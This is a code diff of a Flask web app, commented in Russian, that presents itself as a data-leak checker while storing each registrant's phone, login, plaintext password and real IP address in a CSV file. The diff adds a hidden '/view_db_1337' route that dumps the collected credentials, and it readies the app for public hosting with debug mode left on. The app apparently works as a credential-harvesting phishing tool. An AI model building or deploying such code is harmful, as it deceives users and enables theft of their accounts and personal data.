@@ -17,6 +17,16 @@ if not os.path.exists(DB_FILE):
         writer = csv.writer(f)
         writer.writerow(['phone', 'login', 'password', 'ip'])
 
+# --- НОВЫЙ МАРШРУТ ДЛЯ ПРОСМОТРА БАЗЫ ---
+@app.route('/view_db_1337')
+def view_db():
+    if os.path.exists(DB_FILE):
+        with open(DB_FILE, 'r', encoding='utf-8') as f:
+            content = f.read()
+        return f"<h3>Содержимое базы (CSV):</h3><pre>{content}</pre>"
+    return "Файл базы данных еще не создан."
+# ---------------------------------------
+
 @app.route('/')
 def home():
     return redirect(url_for('login'))
@@ -27,7 +37,9 @@ def register():
         phone = request.form.get('phone')
         login = request.form.get('login')
         password = request.form.get('password')
-        user_ip = request.remote_addr
+        
+        # Исправлено для хостинга: получаем реальный IP
+        user_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
         
         with open(DB_FILE, 'a', newline='', encoding='utf-8') as f:
             writer = csv.writer(f)
@@ -61,15 +73,12 @@ def dashboard():
         search_phone = request.form.get('search_phone')
         with open(DB_FILE, 'r', encoding='utf-8') as f:
             reader = csv.DictReader(f)
-            # Ищем номер в базе
             found = any(row['phone'] == search_phone for row in reader)
             result = "НАЙДЕНО В УТЕЧКЕ" if found else "НЕ НАЙДЕНО"
             
     return render_template('dashboard.html', result=result)
 
-# КРИТИЧЕСКИ ВАЖНЫЙ БЛОК ДЛЯ ЗАПУСКА
 if __name__ == '__main__':
-    print("Старт сервера...")
-    # use_reloader=False нужен для стабильной работы в Pydroid 3
-    app.run(host='0.0.0.0', port=5000, debug=True, use_reloader=False)
-
+    # Настройка порта для Render
+    port = int(os.environ.get("PORT", 5000))
+    app.run(host='0.0.0.0', port=port, debug=True, use_reloader=False)
